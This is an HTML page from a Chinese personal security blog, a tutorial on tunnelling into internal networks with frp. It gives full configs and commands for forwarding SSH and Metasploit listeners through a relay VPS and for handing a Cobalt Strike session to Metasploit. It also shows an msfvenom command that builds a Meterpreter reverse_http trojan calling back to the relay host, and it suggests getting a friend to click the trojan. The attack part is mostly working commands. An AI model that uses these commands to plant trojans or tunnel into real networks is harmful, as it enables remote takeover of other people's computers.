@@ -1,0 +1,902 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/favicon.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="内网,隧道,">
+
+
+
+
+
+  <link rel="alternate" href="/stom.xml" title="Goudan's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="前言这篇文章介绍如何使用frp建立端口转发实现本地kali在公网ssh、本地msf在公网反弹shell；已经上线CS怎么联动本地msf">
+<meta name="keywords" content="内网,隧道">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网隧道技术之frp：简单代理、msf反弹shell、CS联动msf">
+<meta property="og:url" content="http://goudanjun.vip/2021/04/13/内网隧道技术之frp：简单代理、msf反弹shell、CS联动msf.html/index.html">
+<meta property="og:site_name" content="Goudan&#39;s blog">
+<meta property="og:description" content="前言这篇文章介绍如何使用frp建立端口转发实现本地kali在公网ssh、本地msf在公网反弹shell；已经上线CS怎么联动本地msf">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/SPzOlwyQftYe9VA.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/CzukQwom2YnVfMg.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/9tfvkp2edINrBJL.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/IVGTyeigsz4aoln.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/HiXYm4Srvgo5Qku.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/Vzsymxck5jCBtYo.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/C6NlMurK1a2cIpO.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/qClJU7ZSWN3hszB.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/GSqBpxsRliXMn8g.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/fZ38ur9Ub7BlTWm.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/oUzEY1Ml7p3P9XF.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/H5186rlnh3wCEck.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/1jPK5VLzWaISEfB.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/q32CYkmidRF6JIl.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/s6jekU91tymLIQF.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/u82Xrs4qjaGzTOR.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/zHjobKv2dVirXmB.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/7SMZeBLXTs1CcNb.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/y3NMhSCxas4PVpJ.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/nJq9cajT14t3NHV.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/5BXATuni6fgzLGU.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/04/13/7qCw1dmz3YstVBu.jpg">
+<meta property="og:updated_time" content="2021-04-13T08:33:48.642Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="内网隧道技术之frp：简单代理、msf反弹shell、CS联动msf">
+<meta name="twitter:description" content="前言这篇文章介绍如何使用frp建立端口转发实现本地kali在公网ssh、本地msf在公网反弹shell；已经上线CS怎么联动本地msf">
+<meta name="twitter:image" content="https://i.loli.net/2021/04/13/SPzOlwyQftYe9VA.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://goudanjun.vip/2021/04/13/内网隧道技术之frp：简单代理、msf反弹shell、CS联动msf.html/">
+
+
+
+
+
+  <title>内网隧道技术之frp：简单代理、msf反弹shell、CS联动msf | Goudan's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Goudan's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-xssplatform">
+          <a href="http://j36f673471.zicp.vip/xssme/index.php" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-XSSPlatform"></i> <br>
+            
+            XSSPlatform
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/04/13/内网隧道技术之frp：简单代理、msf反弹shell、CS联动msf.html/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="狗蛋菌">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Goudan's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">内网隧道技术之frp：简单代理、msf反弹shell、CS联动msf</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-04-13T16:26:19+08:00">
+                2021-04-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.1k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  4 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章介绍如何使用frp建立端口转发实现本地kali在公网ssh、本地msf在公网反弹shell；已经上线CS怎么联动本地msf</p>
+<a id="more"></a>
+
+<h2 id="frp基础"><a href="#frp基础" class="headerlink" title="frp基础"></a>frp基础</h2><h3 id="1-下载"><a href="#1-下载" class="headerlink" title="1. 下载"></a>1. 下载</h3><p><a href="https://github.com/fatedier/frp/releases" target="_blank" rel="noopener">下载地址</a></p>
+<p>linux版在kali用，windows版在/ps用</p>
+<p><img src="https://i.loli.net/2021/04/13/SPzOlwyQftYe9VA.jpg" alt="1617202234_60648c3a0050ec60a2dcd.png!small?1617202235480"></p>
+<h3 id="2-kali设置代理"><a href="#2-kali设置代理" class="headerlink" title="2. kali设置代理"></a>2. kali设置代理</h3><blockquote>
+<p>vi /etc/proxychains4.conf</p>
+<p>socks5 1.166.166.6 7777</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/04/13/CzukQwom2YnVfMg.jpg" alt="1617215199_6064bedf5f59e9b428c66.png!small"></p>
+<p>使用的时候可以在命令前加proxychains</p>
+<p><img src="https://i.loli.net/2021/04/13/9tfvkp2edINrBJL.jpg" alt="1617215347_6064bf73c7e51e10ae652.png!small"></p>
+<h3 id="3-msf设置代理"><a href="#3-msf设置代理" class="headerlink" title="3. msf设置代理"></a>3. msf设置代理</h3><blockquote>
+<p>setg Proxies socks5:1.166.166.6:7777<br>setg ReverseAllowProxy true</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/04/13/IVGTyeigsz4aoln.jpg" alt="1617215456_6064bfe04a14e5b3fc06b.png!small"></p>
+<h3 id="4-windows设置代理"><a href="#4-windows设置代理" class="headerlink" title="4. windows设置代理"></a>4. windows设置代理</h3><p>使用Proxifier工具</p>
+<h2 id="一级代理"><a href="#一级代理" class="headerlink" title="一级代理"></a>一级代理</h2><p><img src="https://i.loli.net/2021/04/13/HiXYm4Srvgo5Qku.jpg" alt="1617214945_6064bde1165815b2561e5.png!small?1617214946554"></p>
+<h3 id="1-PS配置服务端frps-ini"><a href="#1-PS配置服务端frps-ini" class="headerlink" title="1. /PS配置服务端frps.ini"></a>1. /PS配置服务端frps.ini</h3><blockquote>
+<p>[common]<br>bind_addr = 0.0.0.0<br>bind_port = 7000</p>
+</blockquote>
+<p>运行</p>
+<blockquote>
+<p>frps.exe -c frps.ini</p>
+</blockquote>
+<h3 id="2-内网机器配置客户端frpc-ini"><a href="#2-内网机器配置客户端frpc-ini" class="headerlink" title="2. 内网机器配置客户端frpc.ini"></a>2. 内网机器配置客户端frpc.ini</h3><blockquote>
+<p># frpc.ini<br>[common]<br>server_addr = 1.166.166.6<br>server_port = 7000<br>[http_proxy]<br>type = tcp<br>remote_port = 7777<br>plugin = socks5</p>
+</blockquote>
+<p>运行</p>
+<blockquote>
+<p>frpc.exe -c frpc.ini</p>
+</blockquote>
+<h3 id="3-使用代理"><a href="#3-使用代理" class="headerlink" title="3. 使用代理"></a>3. 使用代理</h3><h2 id="ssh端口转发、msf反弹shell的端口转发—代理配置"><a href="#ssh端口转发、msf反弹shell的端口转发—代理配置" class="headerlink" title="ssh端口转发、msf反弹shell的端口转发—代理配置"></a>ssh端口转发、msf反弹shell的端口转发—代理配置</h2><p>在环境中，/PS起到了桥梁的作用，使得两个内网可以相互通信</p>
+<h3 id><a href="#" class="headerlink" title></a><img src="https://i.loli.net/2021/04/13/Vzsymxck5jCBtYo.jpg" alt="1617214123_6064baab156b2d5027b22.png!small?1617214124585"></h3><h3 id="1-环境描述"><a href="#1-环境描述" class="headerlink" title="1. 环境描述"></a>1. 环境描述</h3><p>1.1 攻击目标内网</p>
+<p>1.2 攻击桥梁/PS(windows)，ip：1.166.166.6</p>
+<p>1.3 本地机器kali linux，ip：10.1.0.4</p>
+<p>1.4 工具：frp</p>
+<h3 id="2-服务端配置"><a href="#2-服务端配置" class="headerlink" title="2. 服务端配置"></a>2. 服务端配置</h3><p>/PS为服务端，假设ip为1.166.166.6</p>
+<p>将下载的文件放在/ps，编辑frps.ini文件配置</p>
+<p><img src="https://i.loli.net/2021/04/13/C6NlMurK1a2cIpO.jpg" alt="1617202982_60648f26e7bc70af0cda8.png!small?1617202984398"></p>
+<blockquote>
+<p>[common]</p>
+<p>bind_port = 60121<br>dashboard_port = 88<br>dashboard_user = admin<br>dashboard_pwd = zcv2!#sWE3x</p>
+</blockquote>
+<p>参数说明：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common] # 名字</span><br><span class="line">bind_port = port # 指的是frp的服务端端口，用来和客户端kali建立连接</span><br><span class="line">dashboard_port = port # 可视化监控平台的端口，访问这个端口会得到一个网页版的监控</span><br><span class="line"># http://1.166.166.6:88</span><br><span class="line">dashboard_user = admin # 网页版的登录用户名</span><br><span class="line">dashboard_pwd = zcv2!#sWE3x # 网页版的登录密码</span><br></pre></td></tr></table></figure>
+
+<p>配置好之后保存，进行运行</p>
+<blockquote>
+<p>frps.exe -c frps.ini</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/04/13/qClJU7ZSWN3hszB.jpg" alt="1617203561_60649169bdb8bb105bb50.png!small?1617203563291"></p>
+<h3 id="3-客户端配置"><a href="#3-客户端配置" class="headerlink" title="3. 客户端配置"></a>3. 客户端配置</h3><p>将文件放进kali，解压命令</p>
+<blockquote>
+<p>tar -zxvf frp_0.36.2_linux_amd64.tar.gz</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/04/13/GSqBpxsRliXMn8g.jpg" alt="1617203431_606490e706d991b42b56f.png!small?1617203432602"></p>
+<p>配置kali，让在本地内网的kali，也能使用公网的IP进行访问，客户端的配置文件为frpc.ini</p>
+<p><img src="https://i.loli.net/2021/04/13/fZ38ur9Ub7BlTWm.jpg" alt="1617203104_60648fa00814bc6a39dfc.png!small?1617203105472"></p>
+<blockquote>
+<p>[common]<br>server_addr = 1.166.166.6<br>server_port = 60121</p>
+<p>[ssh]<br>type = tcp<br>local_ip = 127.0.0.1<br>local_port = 22<br>remote_port = 60122<br>use_compression = true</p>
+<p>[msf]<br>type = tcp<br>local_ip = 127.0.0.1<br>local_port = 1234<br>remote_port = 60123</p>
+</blockquote>
+<p>参数说明</p>
+<blockquote>
+<p>[common]名称<br>server_addr = 1.166.166.6 # 服务器IP<br>server_port = 60121 # /PS的端口，用来建立连接</p>
+<p>[ssh] # 配置ssh登录的端口转发<br>type = tcp # 连接方式为TCP的方式<br>local_ip = 127.0.0.1 # 将本地的IP映射出去<br>local_port = 22 # 本地的端口为22<br>remote_port = 60122 # 映射的端口为60122，本地端口22映射到/PS的60122<br>use_compression = true</p>
+<p>[msf] # 配置msf的监听端口转发<br>type = tcp # 连接方式<br>local_ip = 127.0.0.1 # 本地IP<br>local_port = 1234 # 监听本地的端口<br>remote_port = 60123  # 映射的/PS端口为60123，本地端口1234映射到/PS的60123</p>
+</blockquote>
+<p>在kali中运行</p>
+<blockquote>
+<p>./frpc -c frpc.ini</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/04/13/oUzEY1Ml7p3P9XF.jpg" alt="1617203501_6064912d4332fa79c03d1.png!small?1617203502691"></p>
+<h3 id="4-访问一下frp的web管理页面"><a href="#4-访问一下frp的web管理页面" class="headerlink" title="4. 访问一下frp的web管理页面"></a>4. 访问一下frp的web管理页面</h3><p>访问<a href="http://1.166.166.6:88，输入用户名密码登录" target="_blank" rel="noopener">http://1.166.166.6:88，输入用户名密码登录</a></p>
+<p><img src="https://i.loli.net/2021/04/13/H5186rlnh3wCEck.jpg" alt="1617203679_606491dfd67ce3d4555ab.png!small?1617203681427"></p>
+<p>可以观察到流量的情况</p>
+<p><img src="https://i.loli.net/2021/04/13/1jPK5VLzWaISEfB.jpg" alt="1617203683_606491e3b25f666a603e3.png!small?1617203685175"></p>
+<h3 id="5-测试效果"><a href="#5-测试效果" class="headerlink" title="5. 测试效果"></a>5. 测试效果</h3><p>ssh远程kali，前提是kali开启了远程连接</p>
+<p><img src="https://i.loli.net/2021/04/13/q32CYkmidRF6JIl.jpg" alt="1617204648_606495a8049b097ff6369.png!small?1617204649522"></p>
+<h2 id="CS联动MSF"><a href="#CS联动MSF" class="headerlink" title="CS联动MSF"></a>CS联动MSF</h2><p>将CS已上线的机器进行反弹到本地MSF</p>
+<h3 id="1-在CS中新建一个监听"><a href="#1-在CS中新建一个监听" class="headerlink" title="1. 在CS中新建一个监听"></a>1. 在CS中新建一个监听</h3><p><img src="https://i.loli.net/2021/04/13/s6jekU91tymLIQF.jpg" alt="1617204994_60649702113b8ebba537c.png!small?1617204995585"></p>
+<p><img src="https://i.loli.net/2021/04/13/u82Xrs4qjaGzTOR.jpg" alt="1617204997_60649705174373b5bdeb0.png!small?1617204999116"></p>
+<p>点击Save保存</p>
+<h3 id="2-kali-msf设置监听"><a href="#2-kali-msf设置监听" class="headerlink" title="2. kali msf设置监听"></a>2. kali msf设置监听</h3><p>由于上面frpc.ini配置的msf的1234端口映射到/ps的60123</p>
+<p>所以应该监听本地的1234端口，这里要写reverse_http，与CS对应</p>
+<blockquote>
+<p>msfconsole -x “use exploit/multi/handler; set payload windows/meterpreter/reverse_http; set lhost 127.0.0.1; set lport 1234; exploit -j; “</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/04/13/zHjobKv2dVirXmB.jpg" alt="1617205228_606497ecbaf46a5a6892b.png!small?1617205230658"></p>
+<h3 id="3-CS中选择要联动MSF的会话，右键–增加会话–选择CS-MSF"><a href="#3-CS中选择要联动MSF的会话，右键–增加会话–选择CS-MSF" class="headerlink" title="3. CS中选择要联动MSF的会话，右键–增加会话–选择CS-MSF"></a>3. CS中选择要联动MSF的会话，右键–增加会话–选择CS-MSF</h3><p><img src="https://i.loli.net/2021/04/13/7SMZeBLXTs1CcNb.jpg" alt="1617205629_6064997d0cadb310fdca0.png!small?1617205630471"></p>
+<p><img src="https://i.loli.net/2021/04/13/y3NMhSCxas4PVpJ.jpg" alt="1617205631_6064997f7eeca600dda26.png!small?1617205632899"></p>
+<p>MSF上线！</p>
+<p><img src="https://i.loli.net/2021/04/13/nJq9cajT14t3NHV.jpg" alt="1617205658_6064999a5d0711fcf0775.png!small?1617205659790"></p>
+<p><img src="https://i.loli.net/2021/04/13/5BXATuni6fgzLGU.jpg" alt="1617205697_606499c106349e5d4caef.png!small?1617205698447"></p>
+<h2 id="内网MSF反弹内网shell"><a href="#内网MSF反弹内网shell" class="headerlink" title="内网MSF反弹内网shell"></a>内网MSF反弹内网shell</h2><h3 id="1-生成msf木马"><a href="#1-生成msf木马" class="headerlink" title="1. 生成msf木马"></a>1. 生成msf木马</h3><blockquote>
+<p>msfvenom -p windows/meterpreter/reverse_http LHOST=1.166.166.6 LPORT=60123 -f exe &gt; zf.exe</p>
+</blockquote>
+<p>因为生成的木马由内网机器运行，内网机器只能访问/PS，不能直接访问本地的kali，所以LHOST是/ps，LPORT也是kali映射到/ps的端口</p>
+<h3 id="2-设置监听"><a href="#2-设置监听" class="headerlink" title="2. 设置监听"></a>2. 设置监听</h3><p>这里和CS联动msf的时候一样</p>
+<p>设置监听的时候要考虑：1234是本地监听的端口，60123是/ps的端口，60123的数据转发到kali的1234</p>
+<blockquote>
+<p>msfconsole -x “use exploit/multi/handler; set payload windows/meterpreter/reverse_http; set lhost 127.0.0.1; set lport 1234; exploit -j; “</p>
+</blockquote>
+<h3 id="3-找一个小伙伴的电脑点一下木马"><a href="#3-找一个小伙伴的电脑点一下木马" class="headerlink" title="3. 找一个小伙伴的电脑点一下木马"></a>3. 找一个小伙伴的电脑点一下木马</h3><p>kali上线</p>
+<p><img src="https://i.loli.net/2021/04/13/7qCw1dmz3YstVBu.jpg" alt="1617206873_60649e59100485fe74cf3.png!small?1617206874508"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>内网渗透中隧道时必不可少的，frp搭建隧道相对比较稳定，功能也更加强大，常用的还有EW，都可以进行多级代理</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://cn-sec.com/archives/80364.html" target="_blank" rel="noopener">http://cn-sec.com/archives/80364.html</a></p>
+<p><a href="https://www.freebuf.com/articles/web/268234.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/268234.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/内网/" rel="tag"># 内网</a>
+          
+            <a href="/tags/隧道/" rel="tag"># 隧道</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/03/20/hash长度扩展攻击.html/" rel="next" title="hash长度扩展攻击">
+                <i class="fa fa-chevron-left"></i> hash长度扩展攻击
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">狗蛋菌</p>
+              <p class="site-description motion-element" itemprop="description">Stay Hungry,Stay Foolish</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/stom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/goudanjun" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#frp基础"><span class="nav-number">2.</span> <span class="nav-text">frp基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-下载"><span class="nav-number">2.1.</span> <span class="nav-text">1. 下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-kali设置代理"><span class="nav-number">2.2.</span> <span class="nav-text">2. kali设置代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-msf设置代理"><span class="nav-number">2.3.</span> <span class="nav-text">3. msf设置代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-windows设置代理"><span class="nav-number">2.4.</span> <span class="nav-text">4. windows设置代理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一级代理"><span class="nav-number">3.</span> <span class="nav-text">一级代理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-PS配置服务端frps-ini"><span class="nav-number">3.1.</span> <span class="nav-text">1. /PS配置服务端frps.ini</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-内网机器配置客户端frpc-ini"><span class="nav-number">3.2.</span> <span class="nav-text">2. 内网机器配置客户端frpc.ini</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-使用代理"><span class="nav-number">3.3.</span> <span class="nav-text">3. 使用代理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh端口转发、msf反弹shell的端口转发—代理配置"><span class="nav-number">4.</span> <span class="nav-text">ssh端口转发、msf反弹shell的端口转发—代理配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">4.1.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-环境描述"><span class="nav-number">4.2.</span> <span class="nav-text">1. 环境描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-服务端配置"><span class="nav-number">4.3.</span> <span class="nav-text">2. 服务端配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-客户端配置"><span class="nav-number">4.4.</span> <span class="nav-text">3. 客户端配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-访问一下frp的web管理页面"><span class="nav-number">4.5.</span> <span class="nav-text">4. 访问一下frp的web管理页面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-测试效果"><span class="nav-number">4.6.</span> <span class="nav-text">5. 测试效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CS联动MSF"><span class="nav-number">5.</span> <span class="nav-text">CS联动MSF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-在CS中新建一个监听"><span class="nav-number">5.1.</span> <span class="nav-text">1. 在CS中新建一个监听</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-kali-msf设置监听"><span class="nav-number">5.2.</span> <span class="nav-text">2. kali msf设置监听</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-CS中选择要联动MSF的会话，右键–增加会话–选择CS-MSF"><span class="nav-number">5.3.</span> <span class="nav-text">3. CS中选择要联动MSF的会话，右键–增加会话–选择CS-MSF</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内网MSF反弹内网shell"><span class="nav-number">6.</span> <span class="nav-text">内网MSF反弹内网shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-生成msf木马"><span class="nav-number">6.1.</span> <span class="nav-text">1. 生成msf木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-设置监听"><span class="nav-number">6.2.</span> <span class="nav-text">2. 设置监听</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-找一个小伙伴的电脑点一下木马"><span class="nav-number">6.3.</span> <span class="nav-text">3. 找一个小伙伴的电脑点一下木马</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">8.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 &mdash; <span itemprop="copyrightYear">2021</span>
